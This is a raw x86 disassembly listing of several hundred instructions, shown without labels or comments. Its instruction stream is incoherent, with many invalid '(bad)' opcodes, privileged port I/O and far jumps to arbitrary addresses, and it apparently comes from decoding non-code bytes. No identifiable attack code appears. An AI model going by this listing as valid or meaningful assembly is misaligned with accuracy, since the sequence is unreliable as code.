  41d608:	outs   dx,BYTE PTR ds:[esi]
  41d609:	(bad)  
  41d60a:	loop   0x41d605
  41d60c:	(bad)  
  41d60d:	sbb    edi,esp
  41d60f:	fidiv  DWORD PTR [ebx+0x65]
  41d612:	pop    esi
  41d613:	pop    ebx
  41d614:	xor    eax,0x82b6495b
  41d619:	mov    ds,WORD PTR [ebp-0x2df046de]
  41d61f:	shr    DWORD PTR [edi+0x14],0xc1
  41d623:	and    DWORD PTR [edi],eax
  41d625:	push   edi
  41d626:	sti    
  41d627:	repz xchg edi,eax
  41d629:	pop    eax
  41d62a:	test   al,0x67
  41d62c:	repz jl 0x41d5fa
  41d62f:	ss pop edi
  41d631:	dec    edi
  41d632:	sbb    al,0xab
  41d634:	into   
  41d635:	sub    al,0x81
  41d637:	push   ss
  41d638:	out    dx,eax
  41d639:	jnp    0x41d5ce
  41d63b:	mov    cs,ebp
  41d63d:	sbb    bl,BYTE PTR ds:0xce88c4bd
  41d643:	jecxz  0x41d69b
  41d645:	inc    edx
  41d646:	and    ebx,ecx
  41d648:	mov    cl,0x38
  41d64a:	mov    al,ds:0xc1a60443
  41d64f:	inc    esi
  41d650:	aam    0x18
  41d652:	fwait
  41d653:	mov    ebx,0x2b571d44
  41d658:	loopne 0x41d648
  41d65a:	icebp  
  41d65b:	pop    ds
  41d65c:	iret   
  41d65d:	or     edx,esp
  41d65f:	pop    edx
  41d660:	and    eax,0x5eef191a
  41d665:	jecxz  0x41d6e3
  41d667:	sbb    ah,cl
  41d669:	push   edx
  41d66a:	push   ebx
  41d66b:	dec    edx
  41d66c:	and    BYTE PTR [ebx-0x1cb05d3e],dh
  41d672:	ror    BYTE PTR [ecx+ecx*2-0x5018f314],0xf9
  41d67a:	mov    bh,0x3e
  41d67c:	popa   
  41d67d:	push   esi
  41d67e:	inc    esp
  41d67f:	idiv   cl
  41d681:	mov    eax,0x3e21586
  41d686:	jl     0x41d6fa
  41d688:	jno    0x41d6d4
  41d68a:	pavgb  mm7,QWORD PTR [edi]
  41d68d:	fild   DWORD PTR [ebp+0x35]
  41d690:	push   edi
  41d691:	adc    ecx,DWORD PTR [ebx]
  41d693:	push   0xcf28a4cf
  41d698:	daa    
  41d699:	stos   DWORD PTR es:[edi],eax
  41d69a:	or     al,BYTE PTR [ecx-0x7c]
  41d69d:	or     edi,DWORD PTR [edi-0x4f638aac]
  41d6a3:	mov    ebp,esi
  41d6a5:	ja     0x41d6b7
  41d6a7:	ffreep st(1)
  41d6a9:	std    
  41d6aa:	cmp    cl,cl
  41d6ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6ad:	psllw  mm4,mm6
  41d6b0:	inc    ecx
  41d6b1:	cmp    eax,0xdebf5936
  41d6b6:	(bad)  
  41d6b7:	mov    ds:0xa01b781,eax
  41d6bc:	loopne 0x41d6a8
  41d6be:	in     al,dx
  41d6bf:	cld    
  41d6c0:	pop    es
  41d6c1:	fcom   DWORD PTR [ebp+0x71a07862]
  41d6c7:	cs (bad) 
  41d6c9:	or     DWORD PTR [esi+0x14],ecx
  41d6cc:	mov    ebp,0xc4192f35
  41d6d1:	xor    bh,bh
  41d6d3:	push   0x8e4a8d43
  41d6d8:	sub    ebp,DWORD PTR [edx+0x6a]
  41d6db:	jmp    0xaecc217f
  41d6e0:	pop    edx
  41d6e1:	adc    ch,BYTE PTR ds:[edx]
  41d6e4:	adc    WORD PTR [ecx+edi*8+0x43],di
  41d6e9:	lods   al,BYTE PTR ds:[esi]
  41d6ea:	sub    DWORD PTR [ebx],ebp
  41d6ec:	clc    
  41d6ed:	and    eax,0x42af9d3e
  41d6f2:	shr    BYTE PTR [ebx],1
  41d6f4:	je     0x41d703
  41d6f6:	pcmpgtb mm0,QWORD PTR [edx+0x26531eba]
  41d6fd:	jecxz  0x41d6fe
  41d6ff:	pop    ebp
  41d700:	sbb    ecx,DWORD PTR [ecx]
  41d702:	cmp    edi,edi
  41d704:	icebp  
  41d705:	fcomp  QWORD PTR [edx]
  41d707:	test   eax,0x8217fa0f
  41d70c:	inc    edi
  41d70d:	mov    ds:0x5d5c8dfd,al
  41d712:	into   
  41d713:	pop    ebp
  41d714:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d715:	enter  0x14c2,0x2f
  41d719:	lock arpl WORD PTR [ebx+0x79e1e1f],dx
  41d720:	cmp    BYTE PTR [ebp-0x36],ch
  41d723:	sub    al,0x2
  41d725:	ret    
  41d726:	or     dl,dh
  41d728:	jg     0x41d752
  41d72a:	lods   eax,DWORD PTR ds:[esi]
  41d72b:	push   cs
  41d72c:	in     al,dx
  41d72d:	xor    eax,0x955b79d3
  41d732:	cld    
  41d733:	cmp    BYTE PTR [ebp+0x19c96cbb],ch
  41d739:	add    eax,0x5055454f
  41d73e:	sbb    eax,0xd30a3dbd
  41d743:	in     al,0x6e
  41d745:	xor    eax,0x42d54b2e
  41d74a:	cs sub al,0xa7
  41d74d:	aad    0x56
  41d74f:	jns    0x41d6dc
  41d751:	jg     0x41d7b5
  41d753:	jl     0x41d7b9
  41d755:	imul   esi,DWORD PTR [ebx+0x30],0x8412441c
  41d75c:	jle    0x41d768
  41d75e:	jno    0x41d78f
  41d760:	add    dh,0x8a
  41d763:	lods   al,BYTE PTR ds:[esi]
  41d764:	xor    bl,ch
  41d766:	inc    edx
  41d767:	xor    ebx,edi
  41d769:	adc    dl,BYTE PTR [eax+0x41a2d1d8]
  41d76f:	ret    0xf805
  41d772:	mov    cl,0x22
  41d774:	ja     0x41d756
  41d776:	push   ecx
  41d777:	popf   
  41d778:	test   al,0x28
  41d77a:	push   ebp
  41d77b:	cli    
  41d77c:	or     BYTE PTR [edx+0x3caba5e7],0x4
  41d783:	xor    edx,DWORD PTR [edi-0x2776dfcc]
  41d789:	shr    DWORD PTR [edx+0x2b],cl
  41d78c:	ror    BYTE PTR [ebx+0x42632b06],cl
  41d792:	js     0x41d73f
  41d794:	fmul   DWORD PTR [ecx+ecx*8+0x7c]
  41d798:	ins    DWORD PTR es:[edi],dx
  41d799:	fcom   QWORD PTR [ebx]
  41d79b:	aas    
  41d79c:	and    al,0xc9
  41d79e:	xchg   DWORD PTR [edi+ebp*1-0x5ede8f12],edx
  41d7a5:	add    al,0xb7
  41d7a7:	or     BYTE PTR [edi+esi*8+0x20c9edc8],0xd4
  41d7af:	push   esi
  41d7b0:	add    cl,BYTE PTR [edx+0x4bc57486]
  41d7b6:	test   DWORD PTR ds:0x80a71252,0xa6509907
  41d7c0:	shl    DWORD PTR [ebx],0x6e
  41d7c3:	retf   
  41d7c4:	popf   
  41d7c5:	push   0xe74ddca9
  41d7ca:	retf   0xdb53
  41d7cd:	mov    esi,esi
  41d7cf:	and    eax,0x9c2d9f04
  41d7d4:	pop    ecx
  41d7d5:	mov    ebp,0x7757e5d6
  41d7da:	cmp    eax,0x5884eb5c
  41d7df:	xchg   BYTE PTR [esi-0x7eec0938],ch
  41d7e5:	int    0x46
  41d7e7:	jmp    0xb3e7e74e
  41d7ec:	outs   dx,BYTE PTR ds:[esi]
  41d7ed:	adc    al,0x4
  41d7ef:	pop    ebx
  41d7f0:	xchg   ebx,eax
  41d7f1:	sub    DWORD PTR [eax+ebx*1],edx
  41d7f4:	test   DWORD PTR [ebx+0x31],esp
  41d7f7:	push   cs
  41d7f8:	mov    ch,0xe8
  41d7fa:	mov    ecx,0x9528044b
  41d7ff:	mov    ebx,0x714d5ae
  41d804:	pushf  
  41d805:	lea    ebx,[eax-0x11604c87]
  41d80b:	mov    eax,ds:0x3a59c6bf
  41d810:	jmp    0xa5bd:0x6c905071
  41d817:	jb     0x41d84f
  41d819:	jecxz  0x41d891
  41d81b:	out    0x7a,eax
  41d81d:	sbb    bh,bl
  41d81f:	sbb    eax,0x2140a039
  41d824:	inc    edx
  41d825:	push   es
  41d826:	fiadd  DWORD PTR [esi-0x6d]
  41d829:	or     al,0x2e
  41d82b:	addr16 dec ebp
  41d82d:	inc    ebx
  41d82e:	dec    edx
  41d82f:	xor    ah,BYTE PTR [eax-0x55]
  41d832:	xor    bl,dh
  41d834:	xor    bl,BYTE PTR [ecx+0x78c5074a]
  41d83a:	ficomp DWORD PTR [edi-0x4]
  41d83d:	push   ss
  41d83e:	xchg   ebp,eax
  41d83f:	xchg   ebp,eax
  41d840:	je     0x41d816
  41d842:	je     0x41d85f
  41d844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d845:	inc    ecx
  41d846:	adc    eax,0x9eb00192
  41d84b:	sub    BYTE PTR [edi+edi*2-0x25],ah
  41d84f:	and    DWORD PTR ds:0x575dedff,ecx
  41d855:	fnsave [edx+0x27]
  41d858:	dec    esp
  41d859:	repnz dec ebx
  41d85b:	push   edx
  41d85c:	inc    ecx
  41d85d:	fcomp  QWORD PTR [ecx]
  41d85f:	(bad)  
  41d860:	int    0x56
  41d862:	and    eax,0x780d4841
  41d867:	or     al,0xc7
  41d869:	inc    esp
  41d86a:	sbb    ch,cl
  41d86c:	popa   
  41d86d:	(bad)  
  41d86e:	loopne 0x41d865
  41d870:	in     eax,0x80
  41d872:	or     ebx,edx
  41d874:	mov    esp,es
  41d876:	mov    WORD PTR [ebp-0x497083b5],?
  41d87c:	inc    eax
  41d87d:	out    dx,eax
  41d87e:	lahf   
  41d87f:	push   edx
  41d880:	data16 sbb al,0x50
  41d883:	leave  
  41d884:	ror    BYTE PTR [ebx+0x5d20afd4],cl
  41d88a:	ins    BYTE PTR es:[edi],dx
  41d88b:	sub    eax,eax
  41d88d:	jbe    0x41d88f
  41d88f:	cli    
  41d890:	mov    WORD PTR [esp+ecx*2],?
  41d893:	loopne 0x41d8ea
  41d895:	mov    ebp,0x1ba19a0e
  41d89a:	mov    DWORD PTR [esi-0x559b80a2],eax
  41d8a0:	ins    BYTE PTR es:[edi],dx
  41d8a1:	add    dl,dh
  41d8a3:	jmp    0xa1c010a0
  41d8a8:	push   esp
  41d8a9:	cmp    al,0xd9
  41d8ab:	mov    bh,0x52
  41d8ad:	ja     0x41d84f
  41d8af:	adc    al,0xc6
  41d8b1:	fwait
  41d8b2:	retf   
  41d8b3:	sub    eax,0xdc076428
  41d8b8:	(bad)  
  41d8b9:	adc    DWORD PTR [edx+0x70],esp
  41d8bc:	lock or eax,0x7a736d7a
  41d8c2:	pop    edx
  41d8c3:	xchg   esp,eax
  41d8c4:	scas   eax,DWORD PTR es:[edi]
  41d8c5:	shl    dl,1
  41d8c7:	jnp    0x41d8f1
  41d8c9:	push   0xffffffe9
  41d8cb:	jo     0x41d8ff
  41d8cd:	int3   
  41d8ce:	cdq    
  41d8cf:	xchg   ebx,eax
  41d8d0:	mov    ebp,?
  41d8d2:	dec    ecx
  41d8d3:	mov    cl,0x9
  41d8d5:	gs ins BYTE PTR es:[edi],dx
  41d8d7:	idiv   BYTE PTR [edi-0x3d]
  41d8da:	push   edi
  41d8db:	fcomp  QWORD PTR [esi]
  41d8dd:	add    BYTE PTR ds:0x80a5042,ah
  41d8e3:	mov    ah,0x68
  41d8e5:	mov    DWORD PTR es:[ebx+0x41ae0743],eax
  41d8ec:	pop    edx
  41d8ed:	jno    0x41d899
  41d8ef:	mov    eax,0x504f7917
  41d8f4:	mov    al,ds:0x77b988ec
  41d8f9:	out    0xff,al
  41d8fb:	stos   DWORD PTR es:[edi],eax
  41d8fc:	cmp    al,0x6b
  41d8fe:	dec    eax
  41d8ff:	outs   dx,DWORD PTR ds:[esi]
  41d900:	mov    cl,0xb0
  41d902:	test   BYTE PTR [ecx+0xb],0xc5
  41d906:	mov    cl,0x3f
  41d908:	push   es
  41d909:	aas    
  41d90a:	dec    ebp
  41d90b:	mov    edx,0x2fe144
  41d910:	mov    ah,0x5
  41d912:	jmp    0xbb4d8050
  41d917:	test   eax,0x1540925f
  41d91c:	mov    eax,0x7a594ffc
  41d921:	stos   DWORD PTR es:[edi],eax
  41d922:	dec    eax
  41d923:	jmp    0xb91c32ed
  41d928:	mov    cl,0xed
  41d92a:	stos   BYTE PTR es:[edi],al
  41d92b:	inc    ecx
  41d92c:	popf   
  41d92d:	imul   esp,DWORD PTR [edx+ebp*2],0x1e7b4b8f
  41d934:	sub    al,0x5f
  41d936:	lods   al,BYTE PTR ds:[esi]
  41d937:	inc    eax
  41d938:	jmp    0x3bc65385
  41d93d:	xor    al,0x9a
  41d93f:	in     eax,0x46
  41d941:	mov    dh,0x41
  41d943:	cdq    
  41d944:	daa    
  41d945:	add    edx,0xd09d091d
  41d94b:	mov    ah,0x4c
  41d94d:	mov    bl,0x47
  41d94f:	sti    
  41d950:	push   ebp
  41d951:	xor    DWORD PTR [ecx+0x32],esp
  41d954:	mov    edi,0x6a292f76
  41d959:	mov    bh,0xa6
  41d95b:	dec    edx
  41d95c:	aam    0xf
  41d95e:	push   ds
  41d95f:	and    DWORD PTR [ecx+0x4959b13e],edi
  41d965:	sub    bl,BYTE PTR [ebp+0x31]
  41d968:	test   al,0xcb
  41d96a:	inc    ebp
  41d96b:	push   ebp
  41d96c:	ficom  DWORD PTR [ecx+0x7e6cfbc1]
  41d972:	mov    WORD PTR [edx],fs
  41d974:	inc    ebp
  41d975:	in     al,0x18
  41d977:	int    0x14
  41d979:	xchg   ebp,eax
  41d97a:	sbb    BYTE PTR [edi-0x5e],ah
  41d97d:	bound  esp,QWORD PTR [edi-0x303e36a]
  41d983:	sbb    al,0x53
  41d985:	jmp    0x805577a7
  41d98a:	sbb    eax,0x5fb563a1
  41d98f:	adc    eax,DWORD PTR [esi]
  41d991:	dec    esi
  41d992:	enter  0x17f9,0xb4
  41d996:	les    edx,FWORD PTR ds:0x1f657852
  41d99c:	mov    DWORD PTR [edi+0x4f47266],edi
  41d9a2:	sbb    BYTE PTR [edx+eiz*1+0x5e],ch
  41d9a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9a7:	(bad)  
  41d9a8:	pop    ds
  41d9a9:	sub    ah,BYTE PTR [eax-0x1b4f16a9]
  41d9af:	pop    edi
  41d9b0:	mov    ds,edx
  41d9b2:	mov    DWORD PTR [ecx],ecx
  41d9b4:	adc    DWORD PTR [ebp+0x739f0677],0x6d
  41d9bb:	jge    0x41da0e
  41d9bd:	int    0xb6
  41d9bf:	pop    esi
  41d9c0:	cld    
  41d9c1:	adc    eax,0xddae43d9
  41d9c6:	jle    0x41d9aa
  41d9c8:	ins    DWORD PTR es:[edi],dx
  41d9c9:	inc    eax
  41d9ca:	in     eax,dx
  41d9cb:	mov    ds:0x8a766a15,eax
  41d9d0:	xchg   edx,eax
  41d9d1:	pushf  
  41d9d2:	shr    BYTE PTR [edx],cl
  41d9d4:	fxch   st(3)
  41d9d6:	nop
  41d9d7:	imul   BYTE PTR [ebp+0x3a0f52eb]
  41d9dd:	inc    edi
  41d9de:	xor    ah,BYTE PTR [ecx]
  41d9e0:	dec    edx
  41d9e1:	out    0xfd,eax
  41d9e3:	nop
  41d9e4:	sahf   
  41d9e5:	cli    
  41d9e6:	lea    esi,[eax-0x2062c836]
  41d9ec:	ror    DWORD PTR [ebx+0x7d9f4f1f],cl
  41d9f2:	outs   dx,BYTE PTR ds:[esi]
  41d9f3:	clc    
  41d9f4:	or     ebp,DWORD PTR [esi-0x7b]
  41d9f7:	popa   
  41d9f8:	mov    bl,BYTE PTR [ecx]
  41d9fa:	mov    cl,0x28
  41d9fc:	cli    
  41d9fd:	test   BYTE PTR [ebx-0x35ae1554],dl
  41da03:	add    ch,BYTE PTR [ebx]
  41da05:	(bad)  
  41da06:	in     eax,0x29
  41da08:	fdivr  st,st(3)
  41da0a:	imul   esp,DWORD PTR [ecx+0x287c9bd3],0x79
  41da11:	aas    
  41da12:	sub    ch,BYTE PTR [ecx+0x79]
  41da15:	das    
  41da16:	push   esp
  41da17:	cmp    ah,0x3b
  41da1a:	cmp    eax,0x213aa664
  41da1f:	int    0xd9
  41da21:	add    eax,0x5c016a51
  41da26:	pop    esp
  41da27:	adc    eax,0xe30c6ca6
  41da2c:	jbe    0x41da84
  41da2e:	jge    0x41da59
  41da30:	inc    ecx
  41da31:	sti    
  41da32:	shl    BYTE PTR [eax+0x7f6fdbe7],0x47
  41da39:	cmp    eax,0xc6146769
  41da3e:	add    cl,BYTE PTR [ebx-0x6ccf371d]
  41da44:	in     eax,0x89
  41da46:	inc    ecx
  41da47:	mov    dl,0x5c
  41da49:	aad    0xaf
  41da4b:	sbb    DWORD PTR [esi],edi
  41da4d:	add    eax,edi
  41da4f:	sar    BYTE PTR [esi+ebp*8-0x390baeda],cl
  41da56:	sar    DWORD PTR [eax-0x51],1
  41da59:	jne    0x41da67
  41da5b:	into   
  41da5c:	ror    BYTE PTR [ecx-0x3c],cl
  41da5f:	in     eax,0x6a
  41da61:	dec    ebx
  41da62:	and    eax,0x27d6ddab
  41da67:	mov    cl,0x51
  41da69:	jmp    0xba1db335
  41da6e:	push   esp
  41da6f:	mov    ch,0xdc
  41da71:	fs ss mov eax,0xad8cfbce
  41da78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da79:	mov    ds:0x26ccf9a6,eax
  41da7e:	sub    eax,eax
  41da80:	cmp    DWORD PTR [ebx+0x1f9d06b1],ecx
  41da86:	pop    ds
  41da87:	imul   edx,DWORD PTR [ebx+0x6ea4a049],0x2f
  41da8e:	mov    edx,0x4a530a14
  41da93:	push   0xfffffff0
  41da95:	fcom   QWORD PTR [ecx-0x25d88355]
  41da9b:	popf   
  41da9c:	add    dl,ah
  41da9e:	sahf   
  41da9f:	sbb    dh,dl
  41daa1:	fnstcw WORD PTR [ecx+0x70]
  41daa4:	xlat   BYTE PTR ds:[ebx]
  41daa5:	push   0x211bd8ec
  41daaa:	jb     0x41db03
  41daac:	or     BYTE PTR ds:[edx-0x54],0xf2
  41dab1:	jb     0x41db28
  41dab3:	xor    al,0xe
  41dab5:	cmp    BYTE PTR [ebx+0x2400152d],dh
  41dabb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dabc:	mov    edx,0x6cfd88d6
  41dac1:	pop    es
  41dac2:	cs popf 
  41dac4:	ins    DWORD PTR es:[edi],dx
  41dac5:	sbb    BYTE PTR [ebp-0x3fffa425],al
  41dacb:	shr    DWORD PTR [edi-0x76],cl
  41dace:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dacf:	push   esp
  41dad0:	aas    
  41dad1:	jmp    0x41dab3
  41dad3:	mov    esi,0x505c5147
  41dad8:	jmp    0x41db2d
  41dada:	scas   eax,DWORD PTR es:[edi]
  41dadb:	xchg   edi,eax
  41dadc:	mov    dl,0x66
  41dade:	cmp    al,0xe7
  41dae0:	cdq    
  41dae1:	addr16 mov al,ds:0x30b6
  41dae5:	mov    esi,0x8e990189
  41daea:	add    edx,eax
  41daec:	jns    0x41daab
  41daee:	not    DWORD PTR [edx-0x56]
  41daf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41daf2:	adc    DWORD PTR [ebx-0x7c23f990],esp
  41daf8:	adc    al,0xf
  41dafb:	sub    BYTE PTR [esi+0x6c85edcb],ah
  41db01:	shl    BYTE PTR [ebp-0x6d],1
  41db04:	adc    al,0x68
  41db06:	imul   edi,DWORD PTR [eax+0x7c5df81f],0xffffff94
  41db0d:	sbb    al,0xcf
  41db0f:	lahf   
  41db10:	jecxz  0x41dac0
  41db12:	lock jmp 0x41daa2
  41db15:	daa    
  41db16:	imul   esi,DWORD PTR cs:[ebp-0x60],0xe70d5bb3
  41db1e:	and    BYTE PTR [ebp+0x14],al
  41db21:	popa   
  41db22:	lahf   
  41db23:	lahf   
  41db24:	gs jno 0x41dab2
  41db27:	lahf   
  41db28:	ja     0x41db2c
  41db2a:	xlat   BYTE PTR ds:[ebx]
  41db2b:	arpl   WORD PTR [ebp-0x7f],dx
  41db2e:	mov    cl,0x3a
  41db30:	dec    esp
  41db31:	mov    esi,0x6682d396
  41db36:	inc    ebp
  41db37:	das    
  41db38:	repnz in eax,0x46
  41db3b:	push   ebx
  41db3c:	jp     0x41db9a
  41db3e:	xchg   ebp,eax
  41db3f:	je     0x41dac7
  41db41:	aad    0x6e
  41db43:	jmp    0x41db13
  41db45:	(bad)
  41db48:	mov    dh,0x9f
  41db4a:	jne    0x41db78
  41db4c:	dec    edi
  41db4d:	int3   
  41db4e:	xchg   esp,eax
  41db4f:	sub    al,cl
  41db51:	fadd   st,st(5)
  41db53:	cli    
  41db54:	mov    al,ds:0xd22f9dc6
  41db59:	cmc    
  41db5a:	js     0x41db9a
  41db5c:	push   es
  41db5d:	mov    ch,0x7f
  41db5f:	xor    eax,0x555fb367
  41db64:	sbb    BYTE PTR [ecx+edx*1+0x58],ah
  41db68:	sub    DWORD PTR [edx],0x8ddfa4d3
  41db6e:	sub    eax,0x7c65ff5c
  41db73:	and    DWORD PTR [esi],0x1c
  41db76:	(bad)  
  41db77:	pop    ebx
  41db78:	(bad)  
  41db79:	mov    ebp,0xa4866175
  41db7e:	popf   
  41db7f:	mov    esi,ecx
  41db81:	push   ds
  41db82:	lods   eax,DWORD PTR ds:[esi]
  41db83:	jp     0x41dbaa
  41db85:	ror    DWORD PTR [eax+0x2472e001],cl
  41db8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db8c:	nop
  41db8d:	out    dx,al
  41db8e:	or     eax,DWORD PTR [ecx]
  41db90:	jbe    0x41dbfb
  41db92:	addr16 pop edi
  41db94:	(bad)  
  41db95:	enter  0x3f2c,0x5f
  41db99:	retf   
  41db9a:	sar    DWORD PTR [esi-0x73],cl
  41db9d:	xchg   edx,eax
  41db9e:	(bad)  
  41db9f:	adc    ch,BYTE PTR [ecx]
  41dba1:	cli    
  41dba2:	popf   
  41dba3:	out    0x8e,eax
  41dba5:	cld    
  41dba6:	inc    esi
  41dba7:	bound  edi,QWORD PTR [edi-0x3b]
  41dbaa:	shr    BYTE PTR [ecx],cl
  41dbac:	mov    dh,dh
  41dbae:	sbb    ebp,ebp
  41dbb0:	out    0x2c,al
  41dbb2:	mov    ebx,0x3c3f0fd7
  41dbb7:	or     bl,BYTE PTR [edx+0x67]
  41dbba:	es aas 
  41dbbc:	sub    dl,0x79
  41dbbf:	jnp    0x41dc02
  41dbc1:	pusha  
  41dbc2:	les    ecx,FWORD PTR [ebx+0x7b5009a6]
  41dbc8:	popf   
  41dbc9:	ret    0xcc54
  41dbcc:	(bad)  
  41dbcd:	push   eax
  41dbce:	jno    0x41db92
  41dbd0:	lds    ebp,FWORD PTR [ebx+0x38]
  41dbd3:	mov    esi,0x23e5b554
  41dbd8:	test   al,0xb3
  41dbda:	xor    DWORD PTR [ecx+0x3c55686c],ebp
  41dbe0:	in     al,0xbd
  41dbe2:	mov    ah,0x3d
  41dbe4:	mov    eax,DWORD PTR [esi-0x7e7bb688]
  41dbea:	cdq    
  41dbeb:	fld    DWORD PTR [edx-0x10a1c84c]
  41dbf1:	stc    
  41dbf2:	push   ecx
  41dbf3:	pop    edi
  41dbf4:	hlt    
  41dbf5:	inc    esp
  41dbf6:	mov    ebx,0xe359f21e
  41dbfb:	jmp    0xc8b4:0xb6a8ce36
  41dc02:	shl    eax,1
  41dc04:	add    al,0x65
  41dc06:	xchg   esp,eax
  41dc07:	inc    DWORD PTR ds:0xb4577e7d
  41dc0d:	mov    edi,0x4e172824
  41dc12:	out    0x16,eax
  41dc14:	and    ch,BYTE PTR [esi]
  41dc16:	pop    ebp
  41dc17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc18:	aam    0x7d
  41dc1a:	sbb    dh,dl
  41dc1c:	cmp    eax,0xb33c6416
  41dc21:	xchg   ebp,eax
  41dc22:	std    
  41dc23:	jno    0x41dc85
  41dc25:	lea    edx,[edi-0x39c82a1d]
  41dc2b:	popa   
  41dc2c:	add    DWORD PTR [edi-0x40f16db9],ebp
  41dc32:	inc    ebp
  41dc33:	cmp    edx,ebx
  41dc35:	and    DWORD PTR ds:0xf534496f,0x5b
  41dc3c:	in     al,dx
  41dc3d:	add    BYTE PTR [ebx-0x16],0x13
  41dc41:	in     eax,dx
  41dc42:	das    
  41dc43:	sub    esi,ecx
  41dc45:	jae    0x41dcb2
  41dc47:	gs daa 
  41dc49:	pop    edx
  41dc4a:	mov    ds:0x1087d0a1,al
  41dc4f:	scas   eax,DWORD PTR es:[edi]
  41dc50:	aad    0x21
  41dc52:	pop    es
  41dc53:	fdivr  DWORD PTR [ebp+0x66]
  41dc56:	es push eax
  41dc58:	mov    dl,0xc0
  41dc5a:	mov    ds:0x51d618d0,eax
  41dc5f:	cdq    
  41dc60:	daa    
  41dc61:	mov    ds:0x185a2375,al
  41dc66:	jecxz  0x41dcd5
  41dc68:	xor    al,0xb2
  41dc6a:	loop   0x41dc0f
  41dc6c:	jmp    0x88cf98d4
  41dc71:	stos   BYTE PTR es:[edi],al
  41dc72:	and    eax,0xea1b3e37
  41dc77:	test   BYTE PTR [edi],dh
  41dc79:	mov    dl,0x3f
  41dc7b:	loop   0x41dcdc
  41dc7d:	stos   BYTE PTR es:[edi],al
  41dc7e:	and    ah,BYTE PTR [edi+0x1d]
  41dc81:	jmp    0xc67fc2df
  41dc86:	mov    ebp,0xa902e5ef
  41dc8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc8d:	ins    DWORD PTR es:[edi],dx
  41dc8e:	xchg   esp,eax
  41dc8f:	inc    ebp
  41dc90:	int    0x80
  41dc92:	pushf  
  41dc93:	mov    ah,0x15
  41dc95:	mov    ecx,0x73aa901a
  41dc9a:	dec    edx
  41dc9b:	mov    DWORD PTR [eax-0x77],ebx
  41dc9e:	push   es
  41dc9f:	push   esi
  41dca0:	and    al,dl
  41dca2:	adc    eax,0x4b6afd7c
  41dca7:	push   0x2ceae35
  41dcac:	xchg   esp,eax
  41dcad:	pop    ss
  41dcae:	jl     0x41dd08
  41dcb0:	push   ebx
  41dcb1:	mov    eax,0x4a9f7373
  41dcb6:	sub    ah,ah
  41dcb8:	jns    0x41dc70
  41dcba:	bound  ecx,QWORD PTR [ecx]
  41dcbc:	scas   al,BYTE PTR es:[edi]
  41dcbd:	imul   eax,DWORD PTR [esi+ecx*4+0x15165529],0x521b6c9
  41dcc8:	sbb    edi,DWORD PTR [ebp-0x17]
  41dccb:	scas   al,BYTE PTR es:[edi]
  41dccc:	and    al,0x7
  41dcce:	or     bh,BYTE PTR [esi-0x27952aa9]
  41dcd4:	lea    ecx,[ecx]
  41dcd6:	pop    ecx
  41dcd7:	dec    edi
  41dcd8:	mov    WORD PTR [ebx+0x25],gs
  41dcdb:	int3   
  41dcdc:	xor    DWORD PTR [edx-0x4],ebp
  41dcdf:	dec    edi
  41dce0:	in     eax,dx
  41dce1:	fld    TBYTE PTR [eax+0x43a053c2]
  41dce7:	sar    edi,cl
  41dce9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dceb:	jbe    0x41dd5a
  41dced:	dec    ebx
  41dcee:	shl    BYTE PTR [ebx+0x45],0xcc
  41dcf2:	and    eax,0xc61095db
  41dcf7:	xor    al,0x87
  41dcf9:	addr16 cmp bh,dl
  41dcfc:	iret   
  41dcfd:	sbb    edx,DWORD PTR [ebp-0x7f9a7f9d]
  41dd03:	aas    
  41dd04:	cwde   
  41dd05:	xchg   esp,eax
  41dd06:	fmulp  st(2),st
  41dd08:	sahf   
  41dd09:	pop    ebx
  41dd0a:	loopne 0x41dcea
  41dd0c:	enter  0xac4c,0x70
  41dd10:	xor    BYTE PTR [edx],bh
  41dd12:	xor    bh,BYTE PTR [edx-0x20ff1510]
  41dd18:	sbb    dl,bl
  41dd1a:	shl    DWORD PTR [edi-0x229617a2],0x8b
  41dd21:	inc    edi
  41dd22:	pop    esi
  41dd23:	mov    dl,0xb5
  41dd25:	fcomp  DWORD PTR [edi+ecx*2-0x658b0eb0]
  41dd2c:	adc    BYTE PTR [ebx],ah
  41dd2e:	pushw  0xffad
  41dd31:	dec    esi
  41dd32:	mov    ds:0x7f16655c,eax
  41dd37:	pop    ebp
  41dd38:	dec    esp
  41dd39:	xchg   ecx,eax
  41dd3a:	(bad)  [esi]
  41dd3c:	or     edi,DWORD PTR [eax]
  41dd3e:	adc    BYTE PTR [esi],al
  41dd40:	push   ebx
  41dd41:	leave  
  41dd42:	arpl   WORD PTR [edx+esi*2+0x4edaf810],dx
  41dd49:	not    dh
  41dd4b:	mov    ds:0x410e5ad7,eax
  41dd50:	xchg   esp,eax
  41dd51:	sbb    DWORD PTR [ecx],ecx
  41dd53:	out    dx,eax
  41dd54:	add    edx,DWORD PTR [edx-0x2e]
  41dd57:	xor    eax,0x65380f22
  41dd5c:	aad    0xb3
  41dd5e:	call   0xe43b:0xe99c752
  41dd65:	ret    0x3ab7
  41dd68:	shl    dh,1
  41dd6a:	loope  0x41dd4b
  41dd6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd6d:	repnz jmp 0xdf09:0x199f2844
  41dd75:	ret    
  41dd76:	(bad)  
  41dd77:	out    dx,al
  41dd78:	out    0x68,al
  41dd7a:	rol    DWORD PTR [ebp+0x13],1
  41dd7d:	xchg   ecx,eax
  41dd7e:	mov    dh,0xb4
  41dd80:	stos   DWORD PTR es:[edi],eax
  41dd81:	mov    bh,0x5a
  41dd83:	xor    BYTE PTR [esi+eax*1-0x5e],ch
  41dd87:	test   eax,0xd17684c8
  41dd8c:	inc    ecx
  41dd8d:	xchg   edi,eax
  41dd8e:	dec    esi
  41dd8f:	xchg   esi,eax
  41dd90:	repz adc DWORD PTR [ecx+0x2],ebp
  41dd94:	dec    eax
  41dd95:	mov    ds:0xbd263845,al
  41dd9a:	mov    eax,0x53224078
